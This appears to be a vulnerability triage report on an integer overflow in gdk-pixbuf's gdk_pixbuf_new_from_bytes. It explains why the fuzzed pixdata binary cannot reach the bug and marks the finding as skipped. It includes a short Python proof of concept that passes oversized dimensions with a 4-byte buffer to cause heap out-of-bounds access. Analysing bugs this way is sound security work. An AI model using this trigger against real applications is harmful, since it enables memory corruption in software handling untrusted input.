# VULN-001: Integer Overflow in gdk_pixbuf_new_from_bytes

## Vulnerability Description

**File**: `gdk-pixbuf/gdk-pixbuf-data.c`, line 113  
**Function**: `gdk_pixbuf_new_from_bytes()`

The vulnerable line is:

```c
g_return_val_if_fail(
    g_bytes_get_size(data) >= width * height * (has_alpha ? 4 : 3), NULL);
```

The expression `width * height * (has_alpha ? 4 : 3)` is evaluated as **signed 32-bit integer arithmetic**. With `width=32768`, `height=32768`, and `has_alpha=TRUE`:

```
32768 * 32768 * 4 = 4,294,967,296
```

This value exceeds `INT32_MAX` (2,147,483,647), causing a signed integer overflow. The result wraps to **0** (or an undefined negative value depending on the compiler). The guard condition then becomes:

```c
g_bytes_get_size(data) >= 0   // always true
```

Any `GBytes` object, no matter how small, passes this validation. The pixbuf is then constructed with a claimed `width * height` of 1 billion pixels but backed by only a few bytes of data. Subsequent pixel-access operations (in `gdk_pixdata_from_pixbuf`, serialization, etc.) cause **heap out-of-bounds read/write**.

## Why gdk_pixbuf_new_from_bytes Is Not Reachable from gdk-pixbuf-pixdata

The `gdk-pixbuf-pixdata` binary has one code path:

```c
pixbuf = gdk_pixbuf_new_from_file(infilename, &error);
// then:
gdk_pixdata_from_pixbuf(&pixdata, pixbuf, FALSE);
gdk_pixdata_serialize(&pixdata, &stream_length);
```

`gdk_pixbuf_new_from_file` dispatches to one of the image format loaders (BMP, PNG, JPEG, TIFF, etc.) based on the file's magic bytes. **None of these loaders call `gdk_pixbuf_new_from_bytes`**. This was verified by:

```
grep -r "gdk_pixbuf_new_from_bytes" /data/ylwang/non-textfuzz/target/gdk-pixbuf/gdk-pixbuf/io-*.c
# → no output (zero matches)
```

The loaders allocate pixel buffers through their own internal paths (typically `gdk_pixbuf_new()` or `gdk_pixbuf_new_from_data()`). `gdk_pixbuf_new_from_bytes` is a **public API** function, not an internal one used by loaders.

Consequently, no crafted image file — regardless of format, claimed dimensions, or embedded data — can cause `gdk-pixbuf-pixdata` to call `gdk_pixbuf_new_from_bytes`. The BMP file with 32768x32768 dimensions constructed here will be rejected by the BMP loader before it can trigger any overflow (the loader detects the file is truncated and returns an error).

## Actual Attack Surface

The real attack surface for this vulnerability is **applications that call `gdk_pixbuf_new_from_bytes` directly with attacker-controlled parameters**. Examples:

1. **Language bindings** (Python/GI, JavaScript/GJS): Applications using GObject introspection can call `GdkPixbuf.new_from_bytes()` with user-supplied dimensions and a small `GLib.Bytes` object.

2. **Custom image-processing tools** that accept width, height, and raw pixel data from an untrusted source (e.g., a network protocol, IPC message, or file format that encodes raw pixel dimensions separately from the actual pixel payload).

3. **GTK widget themes or plugins** that call `gdk_pixbuf_new_from_bytes` to create placeholder images.

A working exploit would look like:

```python
import gi
gi.require_version('GdkPixbuf', '2.0')
from gi.repository import GdkPixbuf, GLib

tiny = GLib.Bytes.new(b'\x00' * 4)  # only 4 bytes
# Integer overflow: 32768 * 32768 * 4 = 0 (mod 2^32), passes the size check
pb = GdkPixbuf.Pixbuf.new_from_bytes(
    tiny,
    GdkPixbuf.Colorspace.RGB,
    True,   # has_alpha
    8,      # bits_per_sample
    32768,  # width
    32768,  # height
    32768 * 4  # rowstride
)
# pb is non-NULL; subsequent access causes heap OOB
```

## Summary

| Item | Result |
|------|--------|
| Vulnerability confirmed in source | YES — line 113 of gdk-pixbuf-data.c |
| Reachable from gdk-pixbuf-pixdata | NO — no image loader calls gdk_pixbuf_new_from_bytes |
| Reachable from public API | YES — any app calling gdk_pixbuf_new_from_bytes directly |
| PoC file triggers crash | NO — BMP loader rejects truncated file before reaching overflow |
| Status | SKIPPED |
